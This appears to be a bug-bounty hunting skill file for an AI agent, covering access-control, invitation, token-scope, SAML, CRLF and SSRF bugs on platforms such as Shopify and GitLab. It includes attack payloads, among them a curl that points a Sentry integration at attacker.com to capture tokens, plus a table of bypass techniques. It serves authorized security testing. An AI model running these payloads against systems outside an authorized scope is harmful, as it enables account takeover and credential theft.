---
name: hunt-misc
description: Hunting skill for misc vulnerabilities. Built from 225 public bug bounty reports. Use when hunting misc on any target.
sources: github, hackerone_public
report_count: 225
---

## Crown Jewel Targets

**Why this vuln class pays:**
MISC vulnerabilities span access control failures, information disclosure, session/auth logic bugs, and misconfiguration — the categories that consistently produce the highest payouts because they map directly to business impact: data exposure, account takeover, privilege escalation, and infrastructure compromise.

**Highest-value targets:**
- **SaaS platforms with role hierarchies** (Shopify, GitHub, GitLab) — any boundary between owner/admin/staff/guest is a privilege escalation surface
- **Identity/auth flows** — invitation links, password reset, SAML SSO, OAuth token scopes
- **Multi-tenant systems** — one tenant touching another tenant's data
- **Internal APIs** — LFS endpoints, pre-receive hooks, internal GraphQL/REST that assume caller is trusted
- **Domain/DNS management features** — transfer controls, subdomain delegation
- **Token/credential management** — PAT scopes, deploy keys, API tokens stored in config fields

**Asset types that pay most:**
- Core product APIs (not marketing subdomains)
- Enterprise/self-hosted editions (GitHub Enterprise, GitLab EE)
- Partner/collaborator invitation systems
- OAuth app integrations and webhook endpoints

---

## Attack Surface Signals

**URL patterns to watch:**
```
/admin/*/transfer
/invitations/*
/partners/*/accept
/api/v*/repos/*/lfs/*
/-/settings/integrations/sentry
/api/v*/user/installations
/hooks/pre-receive/*
/reset-password?token=
/auth/saml/callback
/api/v*/packages/pypi/*
```

**Response header signals:**
```
X-Request-Id (pitchfork/Rack — check for header injection)
X-Shopify-Shop-Api-Call-Limit
X-GitLab-*
```

**JS patterns revealing internal surfaces:**
```javascript
// Look for hardcoded internal API paths
fetch('/internal/api/
graphql { installations(
"scope": [], // empty scopes on tokens
"permissions": {"contents": "read"} // minimal scope PATs
```

**Tech stack signals:**
- Ruby/Rack middleware (CRLF injection risk in `pitchfork`)
- SAML SSO enabled on enterprise instances
- PyPI proxy/mirror configurations (dependency confusion)
- Sentry error tracking integration fields (SSRF/token leak vector)
- Multi-role invitation systems (partners, staff, collaborators)

---

## Step-by-Step Hunting Methodology

1. **Map all role/permission boundaries** — enumerate every role level (owner → admin → staff → guest → removed) and document what each role *should* see

   **Marker Discipline:** when probing role boundaries by injecting unique tokens / identifiers into per-role test data, markers MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `attacker`, `evil`, `admin`, `AAAA`. Good markers: `cpmark987abc`, `x4hd2k9pq`. Before claiming any reflection, search the baseline (no-marker) response for the marker — if it appears naturally, change your marker.

   **Body-Diff Rule:** a privilege-bypass claim requires response BODY differential, not status-code-only. 200 OK with byte-identical body to baseline is NOT a bypass. Always diff bodies side-by-side before claiming bypass. Status-code-only claims are the most common rejected-as-N/A category on bug-bounty platforms.

2. **Test invitation flows end-to-end** — accept invitations without completing verification steps; modify invitation tokens; test whether accepting an invitation as a different user grants access

3. **Test post-removal access** — add a user to a resource, remove them, then test if their session/token still grants access (especially after company/org removal)

4. **Fuzz token scope enforcement** — create PATs/tokens with minimal or no scopes, then call API endpoints that *should* require elevated scopes

5. **Test cross-tenant resource access** — as Tenant A, attempt to read/write Tenant B's resources by manipulating IDs, paths, or headers

6. **Probe internal/undocumented API endpoints** — look for LFS endpoints, internal GraphQL operations, pre-receive hook environments, webhook delivery logs

7. **Check SAML/SSO logic** — test signature verification bypass by stripping signatures, modifying NameID, replaying assertions, or manipulating XML namespace

8. **Audit configuration fields for SSRF/token exfiltration** — any URL field in admin settings (Sentry DSN, webhook URL, proxy URL) is a potential SSRF or credential leak

9. **Test password reset and email verification flows** — skip email verification steps; test whether reset tokens are scoped to a single user; test token reuse

10. **Check HTTP header injection points** — any user-controlled input passed into response headers via Ruby/Rack middleware; test CRLF sequences

11. **Verify DNS/subdomain hygiene** — enumerate subdomains, check for dangling CNAME records, verify SPF/DMARC/DKIM records

12. **Test package registry proxy configurations** — look for dependency confusion via forwarded requests to public registries (PyPI, npm, RubyGems)

---

## Payload & Detection Patterns

**CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**
```bash
# Test CRLF in header values
curl -v "https://target.com/path" \
  -H $'X-Custom: value\r\nInjected-Header: evil'

# URL-encoded variant
curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"

# Test in pitchfork/Rack apps — inject via query param reflected in Location header
curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

**Privilege escalation via invitation bypass:**
```bash
# Accept invitation without email verification
curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
  -H "Cookie: session=UNVERIFIED_SESSION" \
  -d '{"role":"admin"}'

# Test invitation token for another user
curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION"
```

**Token scope bypass (GitHub/GitLab PAT):**
```bash
# Call privileged endpoint with minimal-scope token
curl -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \
  "https://api.github.com/repos/org/private-repo/issues"

# Test suspended installation access
curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
  "https://api.github.com/app/installations/SUSPENDED_INSTALL_ID"
```

**SSRF via config URL fields (Sentry integration):**
```bash
# Change Sentry URL to internal listener
curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
  -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \
  -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'
```

**ReDoS detection:**
```bash
# Test Ruby URI parser
ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'

# Test IPAddr
ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'

# Timing-based detection
time curl "https://target.com/search?q=aaaa" # baseline
time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
```

**Grep patterns for source recon:**
```bash
# Find SAML signature verification
grep -r "validate_signature\|verify_signature\|skip.*signature" --include="*.rb"

# Find hardcoded or weak scope checks
grep -r "without_scope\|any_scope\|scope.*bypass" --include="*.rb"

# Find invitation acceptance without verification
grep -r "accept.*invitation\|invitation.*accept" --include="*.rb" | grep -v "verified\|confirmed"

# Find internal API routes
grep -r "internal_api\|/_internal/\|/internal/" --include="*.rb" --include="*.js"
```

**Dangling subdomain / DNS check:**
```bash
# Check for obsolete DNS records
dig CNAME handbook.gitlab.com
curl -sI https://handbook.gitlab.com | head -5
# Look for NXDOMAIN or 404 on hosting provider = takeover candidate

# SPF check
dig TXT rubylang.org | grep spf
# Missing or ~all = email spoofing risk
```

---

## Common Root Causes

1. **Soft deletes without permission invalidation** — removing a user from an org marks them as removed but doesn't revoke active sessions or cached permission checks; subsequent API calls still pass old auth context

2. **Invitation acceptance without verification gate** — developers implement invitation flow optimistically (assume user who received email is legitimate) and skip re-verification when token is consumed by a different session

3. **Token scope checked at issuance, not at use** — PAT/OAuth scopes validated when token is created but individual API endpoint handlers don't re-check scope, trusting middleware that may have a gap

4. **Role-based access control checked at UI layer only** — frontend hides buttons for restricted roles but backend API endpoints don't enforce the same restriction; direct API calls bypass UI gating

5. **SAML XML parsing quirks** — signature covers only part of the document; XML canonicalization differences allow unsigned content to pass verification; namespace prefix attacks

6. **Config/URL fields trusted as internal** — integration URL fields (Sentry, webhooks) assumed to be set only by trusted admins; maintainer-level roles can modify them to exfiltrate tokens

7. **Ruby header injection via string interpolation** — developer builds HTTP response headers by string concatenation without sanitizing newlines; Rack 3 behavioral changes exposed previously-hidden bugs

8. **Proxy/mirror configs forwarding all requests upstream** — package registries configured to fall back to public registries without restricting which packages are internal-only, enabling dependency confusion

9. **Pre-receive hook environments exposing privileged context** — hook scripts run with access to internal environment variables, git internals, or SSH keys that shouldn't be user-accessible

10. **Multi-device session design conflated with session fixation** — engineers implement "remember me across devices" by issuing non-expiring tokens, treating it as a feature while creating persistent access risk

11. **Server-policy responses mistaken for state-based oracles** — when many different path types return the SAME response shape, suspect a server-side blocklist/policy filter, NOT a real file-existence / user-existence / resource-existence oracle. Engineers add blanket filters (e.g., "block any path ending in `.config`/`.ashx`/`.asmx`/`.svc`") that return the same error regardless of whether the underlying file exists. Don't infer "file exists" from "blocked"; verify with an independent signal (Collaborator callback, response-time differential at scale, or out-of-band confirmation). Lesson: SharePoint's `download.aspx?SourceUrl=` returned `"blocked from this Web site by the server administrators"` for `.ashx`/`.asmx`/`.svc`/`.config` extensions regardless of whether the underlying file existed — looked like a file-existence oracle, was actually the extension blocklist. Treating it as the former produced a list of "discovered custom customer-branded endpoints" that didn't actually exist.

---

## Bypass Techniques

**Defender mitigations and how to bypass them:**

| Defense | Bypass |
|---|---|
| Email verification on invitation | Accept token in a different session before verification step completes; test if token is single-use or multi-use |
| Role check on API endpoint | Find alternative API versions (`/v3/` vs `/v4/`), GraphQL aliases, or internal endpoints that skip middleware |
| SAML signature validation | Strip signature element entirely; use XML namespace confusion; inject additional unsigned `Assertion` elements |
| PAT scope enforcement | Find endpoints that check scope at the collection level but not on individual sub-resources; test legacy API versions |
| Token revocation on user removal | Revoke at the org level but not at the app/installation level; test cross-installation token reuse |
| Input sanitization on header values | Try `%0d%0a`, `\r\n`, `\u000d\u000a`, null bytes followed by CRLF; test middleware version-specific parsing |
| Restricting internal API to localhost | Find SSRF vector (Sentry URL, webhook URL) to make server call the internal endpoint on your behalf |
| ReDoS regex hardening | Try different anchor points — if `#` is patched, try `?`, `%`, or other RFC-special characters that trigger backtracking |
| Dependency pinning | Change package names slightly (typosquatting) or target internal package names that aren't published to public registry |
| Subdomain claim validation | Monitor for hosting provider account deletions; use certificate transparency logs to find unclaimed subdomains |

---

## Gate 0 Validation

Before writing the report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be a concrete action: read customer PII, escalate to admin role, take over an account, transfer a domain asset, exfiltrate an API token, inject a response header. "Could potentially..." is not sufficient.

2. **What does the victim LOSE?**
   Must map to a real asset: customer data, account control, financial assets (domains), credentials, code repository contents, or platform trust. "Security best practices not followed" is not a valid answer.

3. **Can it be reproduced in 10 minutes from scratch?**
   Write out the exact steps (no special tooling, no race conditions that require luck). If you need pre-existing conditions (e.g., must already be a maintainer), state them explicitly and verify they're realistic for an attacker to achieve.

---

## Real Impact Examples

**Scenario A — Privilege Escalation via Unverified Partner Invitation (Shopify-class)**
An attacker receives a partner invitation link for a low-privilege role. Before completing email verification, they use the invitation token in a session authenticated as a different account (or no account). The platform grants the elevated partner role without confirming identity, allowing the attacker to access merchant data, install apps, or modify store configurations for all stores in the partner account. Business impact: full partner-level access to hundreds of merchant stores with no legitimate relationship established.

**Scenario B — Cross-Tenant Data Persistence After Removal (Shopify/GitLab-class)**
A staff member with restricted permissions is removed from a company account after a dispute. Their session token remains valid because revocation only updates the membership table, not the session store. The ex-employee continues to access customer PII, order data, and financial reports via direct API calls for days or weeks post-termination. Business impact: GDPR/CCPA breach exposure, potential extortion leverage, competitive intelligence theft.

**Scenario C — SAML Signature Bypass for Account Takeover (GitHub Enterprise-class)**
An attacker targeting a GitHub Enterprise instance with SAML SSO enabled crafts a SAML response where the `Signature` element is stripped or moved to cover only a non-critical assertion attribute. The XML parser accepts the document as valid; the signature verifier passes because the signed sub-element validates correctly; the NameID (username/email) in the unsigned portion is set to a victim admin account. Attacker authenticates as the victim with no knowledge of their password or MFA. Business impact: full admin access to all private repositories, CI/CD secrets, and GitHub Actions workflows in the enterprise.

---

## Related Skills & Chains

- **`hunt-saml`** — SAML signature wrapping (XSW1–XSW8) is the canonical "misc auth" critical. Chain primitive: SAML XSW + `hunt-saml` AttributeStatement injection → NameID swap → ATO of victim admin via SSO with no password.
- **`hunt-business-logic`** — Misc role/permission desync bugs overlap with business-logic state-machine flaws. Chain primitive: business logic (invitation-before-verify) + role assignment without identity confirmation → tenant takeover.
- **`hunt-auth-bypass`** — Session-revocation gaps and stale-token issues are pure auth-bypass primitives. Chain primitive: removed user retains session token → `hunt-auth-bypass` → post-termination data exfil and persistent access.
- **`hunt-ato`** — Most misc auth bugs end at account takeover. Chain primitive: signature-stripping / NameID injection + `hunt-ato` Path 6 (JWT/SAML manipulation) → admin ATO across enterprise.
- **`security-arsenal`** — Load the SAML Raider payload pack, the session-revocation probe checklist, and the Always-Rejected list (rate-limiting on auth, theoretical issues, user enumeration without sensitive PII).
- **`triage-validation`** — Apply the 7-Question Gate plus the Body-Diff Rule: misc bugs are the highest-N/A category — a state desync claim needs a concrete cross-tenant read or admin-action PoC, not just "the API let me call it".